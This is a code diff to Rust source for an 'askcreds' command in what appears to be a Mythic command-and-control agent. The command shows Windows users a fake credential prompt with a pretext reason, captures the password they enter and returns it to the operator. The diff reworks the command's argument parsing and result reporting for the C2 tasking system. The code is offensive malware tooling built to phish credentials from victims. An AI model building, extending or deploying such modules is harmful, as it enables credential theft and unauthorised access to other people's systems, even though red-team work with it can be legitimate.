@@ -4,6 +4,9 @@ use std::ptr;
 use std::thread;
 use std::time::Duration;
 use serde::{Deserialize, Serialize};
+use crate::{AgentTask, AskCredsArgs};
+use crate::mythic_success;
+use crate::mythic_error;
 
 #[cfg(target_os = "windows")]
 use winapi::ctypes::c_void;
@@ -25,12 +28,6 @@ use winapi::um::errhandlingapi::*;
 use winapi::shared::minwindef::*;
 #[cfg(target_os = "windows")]
 use winapi::shared::ntdef::*;
-
-// Command structure for Mythic
-#[derive(Serialize, Deserialize)]
-pub struct AskCredsArgs {
-    pub reason: Option<String>,
-}
 
 #[cfg(target_os = "windows")]
 const TIMEOUT: u32 = 60;
@@ -273,9 +270,16 @@ unsafe extern "system" fn thread_proc(param: *mut c_void) -> DWORD {
     0
 }
 
-// Main command execution function
+// Main command execution function for Mythic
 #[cfg(target_os = "windows")]
-pub fn execute_askcreds(args: AskCredsArgs) -> Result<String, String> {
+pub fn ask_credentials(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
+    // Parse arguments from task parameters
+    let args: AskCredsArgs = if task.parameters.is_empty() {
+        AskCredsArgs { reason: None }
+    } else {
+        serde_json::from_str(&task.parameters)?
+    };
+    
     let reason = args.reason.unwrap_or_else(|| DEFAULT_REASON.to_string());
     
     let result = unsafe {
@@ -297,7 +301,7 @@ pub fn execute_askcreds(args: AskCredsArgs) -> Result<String, String> {
         if handle.is_null() {
             // Clean up the CString if thread creation fails
             let _ = std::ffi::CString::from_raw(reason_ptr);
-            return Err("Failed to create thread for credential prompt".to_string());
+            return Ok(mythic_error!(task.id, "Failed to create thread for credential prompt"));
         }
 
         let wait_result = WaitForSingleObject(handle, TIMEOUT * 1000);
@@ -311,7 +315,7 @@ pub fn execute_askcreds(args: AskCredsArgs) -> Result<String, String> {
             
             // Wait for thread cleanup
             WaitForSingleObject(handle, 2000);
-            Err("Credential prompt timed out".to_string())
+            Ok(mythic_error!(task.id, "Credential prompt timed out"))
         } else {
             // Thread completed, now actually get the credentials
             match ask_creds(&reason) {
@@ -328,12 +332,12 @@ pub fn execute_askcreds(args: AskCredsArgs) -> Result<String, String> {
                             output.push_str(&format!("\n[+] Password: {}", password));
                         }
                         
-                        Ok(output)
+                        Ok(mythic_success!(task.id, output))
                     } else {
-                        Err(creds.error.unwrap_or_else(|| "Failed to capture credentials".to_string()))
+                        Ok(mythic_error!(task.id, creds.error.unwrap_or_else(|| "Failed to capture credentials".to_string())))
                     }
                 }
-                Err(e) => Err(e)
+                Err(e) => Ok(mythic_error!(task.id, e))
             }
         };
 
@@ -349,14 +353,14 @@ pub fn execute_askcreds(args: AskCredsArgs) -> Result<String, String> {
 
 // macOS placeholder implementation
 #[cfg(target_os = "macos")]
-pub fn execute_askcreds(_args: AskCredsArgs) -> Result<String, String> {
-    Err("askcreds command is not implemented for macOS".to_string())
+pub fn ask_credentials(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
+    Ok(mythic_error!(task.id, "askcreds command is not implemented for macOS"))
 }
 
 // Fallback for other platforms
-#[cfg(not(target_os = "windows"))]
-pub fn execute_askcreds(_args: AskCredsArgs) -> Result<String, String> {
-    Err("askcreds command is only supported on Windows".to_string())
+#[cfg(not(any(target_os = "windows", target_os = "macos")))]
+pub fn ask_credentials(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
+    Ok(mythic_error!(task.id, "askcreds command is only supported on Windows"))
 }
 
 #[cfg(test)]
